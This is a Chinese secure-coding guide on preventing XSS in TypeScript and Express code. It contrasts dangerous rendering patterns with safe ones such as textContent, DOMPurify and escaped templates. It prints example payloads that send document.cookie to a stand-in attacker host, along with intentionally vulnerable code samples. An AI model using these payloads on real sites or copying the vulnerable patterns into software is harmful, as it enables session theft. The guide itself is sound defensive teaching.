# 防范 XSS（跨站脚本）安全编码规范

## 什么是 XSS

XSS（Cross-Site Scripting，跨站脚本）是指攻击者将恶意脚本注入到网页中，当其他用户浏览该页面时，脚本在受害者浏览器中执行，从而窃取 Cookie/Session、重定向页面、替换页面内容或进行键盘记录。

**典型攻击场景1 —— 反射型 XSS**

搜索功能将关键词回显到页面：
```
输入: <script>fetch('https://attacker.com/?c='+document.cookie)</script>
页面输出: 搜索结果：<script>fetch(...)</script>
```
受害者访问含该 payload 的链接时，Cookie 被窃取。

**典型攻击场景2 —— 存储型 XSS**

评论内容未过滤直接存储并渲染：
```
评论: <img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
```
任意用户查看该评论时触发恶意请求。

## 漏洞示例（禁止使用）

### 示例1（危险）：innerHTML 直接插入用户数据

```typescript
// 危险：innerHTML 会解析并执行 HTML 标签和事件处理器
function renderComment(comment: string) {
  document.getElementById('comment')!.innerHTML = comment;
}
// 攻击：comment = '<img src=x onerror=alert(document.cookie)>'
```

### 示例2（危险）：服务端模板直接输出用户输入

```typescript
// 危险：Express + ejs，未转义直接输出
app.get('/search', (req, res) => {
  const keyword = req.query.keyword;
  res.render('search', { keyword }); // 模板中：<%- keyword %> （不转义）
});
```

### 示例3（危险）：React dangerouslySetInnerHTML 使用原始输入

```typescript
// 危险：跳过 React 的 XSS 防护
function Comment({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
```

### 示例4（危险）：动态构造 javascript: 链接

```typescript
// 危险：href 接受 javascript: 协议
const url = req.query.redirect as string;
res.send(`<a href="${url}">点击继续</a>`);
// 攻击：url = "javascript:alert(document.cookie)"
```

## 安全编码示例（推荐）

### 示例1：使用 textContent 替代 innerHTML

```typescript
// 安全：textContent 只插入纯文本，不解析 HTML
function renderComment(comment: string) {
  document.getElementById('comment')!.textContent = comment;
}
```

### 示例2：使用 DOMPurify 净化富文本

```typescript
import DOMPurify from 'dompurify';

// 安全：允许富文本但净化危险标签和属性
function renderRichContent(html: string) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
  });
  document.getElementById('content')!.innerHTML = clean;
}
```

### 示例3：服务端模板使用转义输出

```typescript
// 安全：ejs 使用 <%= %> 转义输出（而非 <%- %>）
// 模板：<p>搜索关键词：<%= keyword %></p>
// ejs 会将 < > & " 等字符转义为 HTML 实体

app.get('/search', (req, res) => {
  const keyword = String(req.query.keyword ?? '');
  res.render('search', { keyword }); // 模板中使用 <%= keyword %>
});
```


### 示例4：URL 白名单校验，防止 javascript: 协议

```typescript
// 安全：校验 URL 只允许 http/https 协议
function isSafeUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:' || parsed.protocol === 'http:';
  } catch {
    return false;
  }
}

app.get('/redirect', (req, res) => {
  const url = String(req.query.url ?? '');
  if (!isSafeUrl(url)) {
    return res.status(400).send('非法跳转地址');
  }
  res.redirect(url);
});
```

## 核心原则总结

- **文本用 textContent**：无需渲染 HTML 时，始终用 `textContent` 而非 `innerHTML`
- **净化富文本**：必须插入 HTML 时，先用 `DOMPurify.sanitize()` 净化，再写入 DOM
- **服务端转义**：服务端渲染时使用转义输出（ejs: `<%= %>`），禁用不转义标签
- **URL 协议白名单**：动态构造链接时，校验协议只允许 `http:` / `https:`
